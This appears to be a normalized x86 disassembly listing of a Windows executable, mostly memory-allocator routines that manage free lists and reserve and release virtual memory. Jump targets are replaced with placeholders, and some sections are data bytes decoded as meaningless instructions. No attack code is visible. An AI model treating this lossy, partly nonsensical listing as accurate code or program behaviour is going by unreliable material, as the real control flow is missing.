sub_401143
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403320
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401165
inc ebp
adc [ eax ] eax
dec edi
adc [ eax ] eax
pop ecx
adc [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
adc [ gs : eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
xor al 0x40
add [ eax - 0x4bffbfaa ] ch
push esi
inc eax
add al cl
xor al 0x40
add [ esp + esi + 0x56c40040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
adc [ ecx + ecx * 2 + 0x6e ] edx
je r-xdata
inc eax
add [ ecx + 0x11 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar bh 0x25
jb r-xdata
mov [ ecx ] es
inc edi
add [ ebx - 0x77da0040 ] cl
add [ edi ] eax
mov eax eax
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401370
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401330
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013c8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401370
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401410
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013c8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401480
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013c8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401514
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401578
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401340
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_4015f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4013f8
mov [ rw-data ] 0x1
sub_4016a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401340
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40173c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401514
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016a8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401410
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4015f0
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_40184c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016a8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_401970
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40173c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4015f0
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401480
jmp r-xdata
sub_4019fc
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ab2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401350
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
push 0xff8
push 0x0
call sub_401330
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401358
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ab9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401360
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ac0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401b96
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401358
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401368
retn
push rw-data
call sub_401360
sub_401ba0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c04
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c34
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e08
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401c88
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c64
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cb0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401ba0
add ebx esi
mov [ rw-data ] 0x6
sub_401d20
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401ba0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c04
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401970
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401970
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c34
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401480
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401c88
sub_401e08
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d58
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401e90
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c64
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401edc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401e90
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cb0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d20
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c34
sub [ edi + 0x4 ] 0x4
sub_401f68
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017bc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401f94
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40184c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fc8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_401ff4
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401ba0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e08
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f68
test al al
jne r-xdata
mov eax esi
call sub_401fc8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4020e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_4019fc
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402264
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401358
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_401ff4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401360
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403aa4
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403aa4
jmp r-xdata
sub_402278
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40240a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401358
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401360
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403aa4
jmp r-xdata
call sub_401e90
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401ba0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e08
mov edx [ eax + 0x8 ]
add ebx edx
